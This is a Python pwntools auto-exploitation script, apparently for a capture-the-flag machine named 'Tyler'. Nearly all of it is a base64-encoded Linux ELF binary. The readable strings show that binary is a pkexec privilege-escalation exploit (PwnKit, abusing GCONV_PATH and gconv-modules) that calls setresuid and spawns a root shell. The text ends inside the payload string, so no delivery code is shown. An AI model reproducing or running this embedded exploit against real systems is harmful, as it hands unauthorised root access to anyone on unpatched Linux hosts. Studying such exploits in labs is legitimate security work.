import signal,sys
try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Autopwn Tyler ~ 0xASTUTE\n")
except:
    print('\n[\033[1;31m!\033[1;37m] this script requires sudo previlages\n\n[\033[1;31m!\033[1;37m] Try installing pwntools python library\n')
    exit(1)
def kill(sig, frame):
    print("\n[\033[1;31m-\033[1;37m] Bye ASTUTE \n")
    sys.exit(1)
target=sys.argv[1] 
signal.signal(signal.SIGINT, kill)
payload = ('f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAARMAAAAAAABAAAAAAAAAAHg9AAAAAAAAAAAAAEAAOAAN\nAEAAJAAjAAYAAAAEAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAA2AIAAAAAAADYAgAAAAAAAAgA\nAAAAAAAAAwAAAAQAAACgIQAAAAAAAKAhAAAAAAAAoCEAAAAAAAAcAAAAAAAAABwAAAAAAAAAEAAA\nAAAAAAABAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAMAAAAAAAAQAwAAAAAAAAAEAAA\nAAAAAAEAAAAFAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAsQcAAAAAAACxBwAAAAAAAAAQAAAA\nAAAAAQAAAAQAAAAAIAAAAAAAAAAgAAAAAAAAACAAAAAAAADUAgAAAAAAANQCAAAAAAAAABAAAAAA\nAAABAAAABgAAAAguAAAAAAAACD4AAAAAAAAIPgAAAAAAAOgCAAAAAAAA8AIAAAAAAAAAEAAAAAAA\nAAIAAAAGAAAAGC4AAAAAAAAYPgAAAAAAABg+AAAAAAAAwAEAAAAAAADAAQAAAAAAAAgAAAAAAAAA\nBAAAAAQAAAAYAwAAAAAAABgDAAAAAAAAGAMAAAAAAAAwAAAAAAAAADAAAAAAAAAACAAAAAAAAAAE\nAAAABAAAAEgDAAAAAAAASAMAAAAAAABIAwAAAAAAACQAAAAAAAAAJAAAAAAAAAAEAAAAAAAAAFPl\ndGQEAAAAGAMAAAAAAAAYAwAAAAAAABgDAAAAAAAAMAAAAAAAAAAwAAAAAAAAAAgAAAAAAAAAUOV0\nZAQAAAC8IQAAAAAAALwhAAAAAAAAvCEAAAAAAAA8AAAAAAAAADwAAAAAAAAABAAAAAAAAABR5XRk\nBgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAFLldGQE\nAAAACC4AAAAAAAAIPgAAAAAAAAg+AAAAAAAA+AEAAAAAAAD4AQAAAAAAAAEAAAAAAAAABAAAACAA\nAAAFAAAAR05VAAEAAcAEAAAAAQAAAAAAAAACAAHABAAAAAAAAAAAAAAABAAAABQAAAADAAAAR05V\nAKBJKV6UAQ38MTxeWm8oKmigR1IrAAAAAAMAAAAeAAAAAQAAAAYAAAAgAIAQpAQiFB4AAAAhAAAA\nIgAAAKYKGrhW+WAPYwx/DzWnUoB8cZ18e8nHKQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAV\nAQAAEgAAAAAAAAAAAAAAAAAAAAAAAACBAAAAEgAAAAAAAAAAAAAAAAAAAAAAAACSAAAAEgAAAAAA\nAAAAAAAAAAAAAAAAAABuAAAAEgAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAIAAAAAAAAAAAAAAAAAAA\nAAAAAACjAAAAEgAAAAAAAAAAAAAAAAAAAAAAAACMAAAAEgAAAAAAAAAAAAAAAAAAAAAAAAC2AAAA\nEgAAAAAAAAAAAAAAAAAAAAAAAADCAAAAEgAAAAAAAAAAAAAAAAAAAAAAAAAcAQAAEgAAAAAAAAAA\nAAAAAAAAAAAAAAC7AAAAEgAAAAAAAAAAAAAAAAAAAAAAAAAmAQAAEgAAAAAAAAAAAAAAAAAAAAAA\nAADpAAAAEgAAAAAAAAAAAAAAAAAAAAAAAAD8AAAAEgAAAAAAAAAAAAAAAAAAAAAAAADLAAAAEgAA\nAAAAAAAAAAAAAAAAAAAAAAC1AAAAEgAAAAAAAAAAAAAAAAAAAAAAAAC8AAAAEgAAAAAAAAAAAAAA\nAAAAAAAAAADTAAAAEgAAAAAAAAAAAAAAAAAAAAAAAADdAAAAEgAAAAAAAAAAAAAAAAAAAAAAAAD1\nAAAAEgAAAAAAAAAAAAAAAAAAAAAAAAABAAAAIAAAAAAAAAAAAAAAAAAAAAAAAADuAAAAEgAAAAAA\nAAAAAAAAAAAAAAAAAACvAAAAEgAAAAAAAAAAAAAAAAAAAAAAAAB1AAAAEgAAAAAAAAAAAAAAAAAA\nAAAAAACpAAAAEgAAAAAAAAAAAAAAAAAAAAAAAAAsAAAAIAAAAAAAAAAAAAAAAAAAAAAAAABGAAAA\nIgAAAAAAAAAAAAAAAAAAAAAAAADYAAAAEgAAAAAAAAAAAAAAAAAAAAAAAADiAAAAEgAAAAAAAAAA\nAAAAAAAAAAAAAABVAAAAEQAPAKAhAAAAAAAAHAAAAAAAAACGAAAAEgAMAAETAAAAAAAAYQMAAAAA\nAAAEAQAAEgAMAGIWAAAAAAAABwAAAAAAAAAKAQAAEgAMAGkWAAAAAAAAOQEAAAAAAAB8AAAAEgAM\nANYSAAAAAAAAKwAAAAAAAABkAAAAEgAMAJkSAAAAAAAAPQAAAAAAAAAAX19nbW9uX3N0YXJ0X18A\nX0lUTV9kZXJlZ2lzdGVyVE1DbG9uZVRhYmxlAF9JVE1fcmVnaXN0ZXJUTUNsb25lVGFibGUAX19j\neGFfZmluYWxpemUAc2VydmljZV9pbnRlcnAAdW5saW5rX2NiAHJlbW92ZQBwZXJyb3IAcm1yZgBu\nZnR3AGVudHJ5AG1rZGlyAF9fZXJybm9fbG9jYXRpb24AX2V4aXQAY3JlYXQAZm9wZW4AZnB1dHMA\nZmNsb3NlAHJlYWRsaW5rAHN5bWxpbmsAcGlwZQBmb3JrAHJlYWQAc3Ryc3RyAGR1cDIAbWVtY3B5\nAGV4ZWN2ZQBleGVjdnBlAGdjb252AGdjb252X2luaXQAZ2V0ZW52AHNldHJlc3VpZABzZXRyZXNn\naWQAbGliYy5zby42AEdMSUJDXzIuMTQAR0xJQkNfMi4xMQBHTElCQ18yLjMuMwBHTElCQ18yLjIu\nNQAAAAIAAwACAAIAAQACAAIAAgACAAIAAgACAAIABAACAAIAAgACAAIAAgABAAUAAgACAAIAAQAC\nAAIAAgABAAEAAQABAAEAAQABAAQAMAEAABAAAAAAAAAAlJGWBgAABQA6AQAAEAAAAJGRlgYAAAQA\nRQEAABAAAABzGWkJAAADAFABAAAQAAAAdRppCQAAAgBcAQAAAAAAAAg+AAAAAAAACAAAAAAAAACQ\nEgAAAAAAABA+AAAAAAAACAAAAAAAAABAEgAAAAAAAOhAAAAAAAAACAAAAAAAAADoQAAAAAAAANg/\nAAAAAAAABgAAAAUAAAAAAAAAAAAAAOA/AAAAAAAABgAAABUAAAAAAAAAAAAAAOg/AAAAAAAABgAA\nACMAAAAAAAAAAAAAAPA/AAAAAAAABgAAABoAAAAAAAAAAAAAAPg/AAAAAAAABgAAABsAAAAAAAAA\nAAAAABhAAAAAAAAABwAAAAEAAAAAAAAAAAAAACBAAAAAAAAABwAAAAIAAAAAAAAAAAAAAChAAAAA\nAAAABwAAAAMAAAAAAAAAAAAAADBAAAAAAAAABwAAAAQAAAAAAAAAAAAAADhAAAAAAAAABwAAAAYA\nAAAAAAAAAAAAAEBAAAAAAAAABwAAAAcAAAAAAAAAAAAAAEhAAAAAAAAABwAAAAgAAAAAAAAAAAAA\nAFBAAAAAAAAABwAAACIAAAAAAAAAAAAAAFhAAAAAAAAABwAAAAkAAAAAAAAAAAAAAGBAAAAAAAAA\nBwAAAAoAAAAAAAAAAAAAAGhAAAAAAAAABwAAAAsAAAAAAAAAAAAAAHBAAAAAAAAABwAAAAwAAAAA\nAAAAAAAAAHhAAAAAAAAABwAAAA0AAAAAAAAAAAAAAIBAAAAAAAAABwAAAA4AAAAAAAAAAAAAAIhA\nAAAAAAAABwAAAA8AAAAAAAAAAAAAAJBAAAAAAAAABwAAABAAAAAAAAAAAAAAAJhAAAAAAAAABwAA\nABEAAAAAAAAAAAAAAKBAAAAAAAAABwAAABIAAAAAAAAAAAAAAKhAAAAAAAAABwAAABMAAAAAAAAA\nAAAAALBAAAAAAAAABwAAABQAAAAAAAAAAAAAALhAAAAAAAAABwAAABYAAAAAAAAAAAAAAMBAAAAA\nAAAABwAAABcAAAAAAAAAAAAAAMhAAAAAAAAABwAAABgAAAAAAAAAAAAAANBAAAAAAAAABwAAABkA\nAAAAAAAAAAAAANhAAAAAAAAABwAAABwAAAAAAAAAAAAAAOBAAAAAAAAABwAAAB0AAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPMPHvpIg+wI\nSIsF0S8AAEiFwHQC/9BIg8QIwwAAAAAA/zXiLwAA/yXkLwAADx9AAP8l4i8AAGgAAAAA6eD/////\nJdovAABoAQAAAOnQ/////yXSLwAAaAIAAADpwP////8lyi8AAGgDAAAA6bD/////JcIvAABoBAAA\nAOmg/////yW6LwAAaAUAAADpkP////8lsi8AAGgGAAAA6YD/////JaovAABoBwAAAOlw/////yWi\nLwAAaAgAAADpYP////8lmi8AAGgJAAAA6VD/////JZIvAABoCgAAAOlA/////yWKLwAAaAsAAADp\nMP////8lgi8AAGgMAAAA6SD/////JXovAABoDQAAAOkQ/////yVyLwAAaA4AAADpAP////8lai8A\nAGgPAAAA6fD+////JWIvAABoEAAAAOng/v///yVaLwAAaBEAAADp0P7///8lUi8AAGgSAAAA6cD+\n////JUovAABoEwAAAOmw/v///yVCLwAAaBQAAADpoP7///8lOi8AAGgVAAAA6ZD+////JTIvAABo\nFgAAAOmA/v///yUqLwAAaBcAAADpcP7///8lIi8AAGgYAAAA6WD+////JRovAABoGQAAAOlQ/v//\nSI09GS8AAEiNBRIvAABIOfh0FUiLBe4tAABIhcB0Cf/gDx+AAAAAAMMPH4AAAAAASI096S4AAEiN\nNeIuAABIKf5IifBIwe4/SMH4A0gBxkjR/nQUSIsFxS0AAEiFwHQI/+BmDx9EAADDDx+AAAAAAPMP\nHvqAPaUuAAAAdTNVSIM9oi0AAABIieV0DUiLPYYuAAD/FZAtAADoY////8YFfC4AAAFdw2YuDx+E\nAAAAAADDZmYuDx+EAAAAAAAPH0AA8w8e+uln////VUiJ5UiD7DBIiX3oSIl14IlV3EiJTdBIi0Xo\nSInH6KT9//+JRfyDffwAdAxIi0XoSInH6L/+//+LRfzJw1VIieVIg+wQSIl9+EiLRfi5CQAAALpA\nAAAASIs18SwAAEiJx+hB/f//ycNVSInlSIHscBAAAGRIiwQlKAAAAEiJRfgxwEiJ6ItACImFkO//\n/0iJ6EiDwBBIiYWg7///vv8BAABIjQW/DAAASInH6Df9//+JhZTv//+DvZTv////dSXo8/z//4sA\ng/gRdBlIjQWiDAAASInH6B3+//+/AQAAAOjz/P//vv8BAABIjQWfDAAASInH6A/+//+JhZTv//++\n/wEAAEiNBZoMAABIicfo1fz//4mFlO///0iNBY0MAABIicZIjQWGDAAASInH6Lb9//9IiYWo7///\nSIO9qO///wB1GUiNBXwMAABIicfopv3//78BAAAA6Hz8//9Ii4Wo7///SInGSI0FewwAAEiJx+gT\n/f//hcB5GUiNBYkMAABIicfocP3//78BAAAA6Eb8//9Ii4Wo7///SInH6Jf8//9IjYXw7///ugAQ\nAABIicZIjQVpDAAASInH6Fn8///GhAXw7///AEiNhfDv//9IjRVaDAAASInWSInH6Jj8//+JhZTv\n//+DvZTv////dRlIjQVLDAAASInH6Pr8//+/AQAAAOjQ+///SI2FuO///0iJx+iR/P//6Pz8//+F\nwA+FkAAAAIuFvO///4nH6Gf8//+Lhbjv//9IjY3w7///uv8PAABIic6Jx+hr/P//xoQF8O///wBI\njYXw7///SI0V8gsAAEiJ1kiJx+i6/P//SInCSI2F8O///0g5wnUtSI0F5AsAAEiJx+hs+///SI0F\n1QoAAEiJx+ht+///SI0FAwsAAEiJx+he+///vwAAAADoJPv//4uFuO///4nH6Nf7//+Lhbzv//++\nAgAAAInH6IX7//+Lhbzv//+Jx+i4+///SMeFmO///wAAAACDvZDv//8BfjBIi4Wg7///SIPACEiL\nAEiD6AS6BAAAAEiNDYULAABIic5Iicfou/v//0iJhZjv//9Ix4Ww7///AAAAAEiNBW8KAABIiYXA\n7///SI0FWAsAAEiJhcjv//9IjQVcCwAASImF0O///0iNBV0LAABIiYXY7///SIuFmO///0iJheDv\n//9Ix4Xo7///AAAAAEiNlcDv//9IjYWw7///SInGSI0FMgsAAEiJx+go+///SI2VwO///0iNhbDv\n//9IicZIjQUiCwAASInH6Kj6//+/AAAAAOgO+v//VUiJ5ZBdw1VIieVIg+xQZEiLBCUoAAAASIlF\n+DHAvwIAAADopvr//74CAAAAvwEAAADoV/r//0iNBdkKAABIicfoiPn//0iJRbi6AAAAAL4AAAAA\nvwAAAADoAPr//7oAAAAAvgAAAAC/AAAAAOgM+v//SI0FJQkAAEiJx+i9+f//SI0FUwkAAEiJx+iu\n+f//SIN9uAB0Q0iNBX0KAABIiUXQSI0FegoAAEiJRdhIi0W4SIlF4EjHRegAAAAASI1F0LoAAAAA\nSInGSI0FSwoAAEiJx+gm+v//61xIjQVFCgAASIlFwEjHRcgAAAAASI1FwLoAAAAASInGSI0FKQoA\nAEiJx+j2+f//SI0FDAoAAEiJRdBIx0XYAAAAAEiNRdC6AAAAAEiJxkiNBe0JAABIicfoyPn//78A\nAAAA6M74//8AAPMPHvpIg+wISIPECMMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABHQ09OVl9QQVRIPS4ARmFp\nbGVkIHRvIGNyZWF0ZSBkaXJlY3RvcnkAR0NPTlZfUEFUSD0uLy5wa2V4ZWMALnBrZXhlYwB3KwAu\ncGtleGVjL2djb252LW1vZHVsZXMARmFpbGVkIHRvIG9wZW4gb3V0cHV0IGZpbGUAAAAAAAAAAG1v\nZHVsZSBVVEYtOC8vIFBLRVhFQy8vIHBrZXhlYyAyAEZhaWxlZCB0byB3cml0ZSBjb25maWcAL3By\nb2Mvc2VsZi9leGUALnBrZXhlYy9wa2V4ZWMuc28ARmFpbGVkIHRvIGNvcHkgZmlsZQBwa2V4ZWMg\nLS12ZXJzaW9uAAAARXhwbG9pdCBmYWlsZWQuIFRhcmdldCBpcyBtb3N0IGxpa2VseSBwYXRjaGVk\nLgBDTUQ9AFBBVEg9R0NPTlZfUEFUSD0uAENIQVJTRVQ9cGtleGVjAFNIRUxMPXBrZXhlYwAvdXNy\nL2Jpbi9wa2V4ZWMAcGtleGVjAENNRAAvYmluL3NoAC1jAC1pAC9iaW4vYmFzaAAAAAAAAAAAAAAA\nAC9saWI2NC9sZC1saW51eC14ODYtNjQuc28uMgABGwM7OAAAAAYAAABk7v//VAAAAN3w//98AAAA\nGvH//5wAAABF8f//vAAAAKb0///YAAAArfT///gAAAAUAAAAAAAAAAF6UgABeBABGwwHCJABAAAk\nAAAAHAAAAAju//+wAQAAAA4QRg4YSg8LdwiAAD8aOyozJCIAAAAAHAAAAEQAAABZ8P//PQAAAABB\nDhCGAkMNBngMBwgAAAAcAAAAZAAAAHbw//8rAAAAAEEOEIYCQw0GZgwHCAAAABgAAACEAAAAgfD/\n/2EDAAAAQQ4QhgJDDQYAAAAcAAAAoAAAAMbz//8HAAAAAEEOEIYCQw0GQgwHCAAAABgAAADAAAAA\nrfP//zkBAAAAQQ4QhgJDDQYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA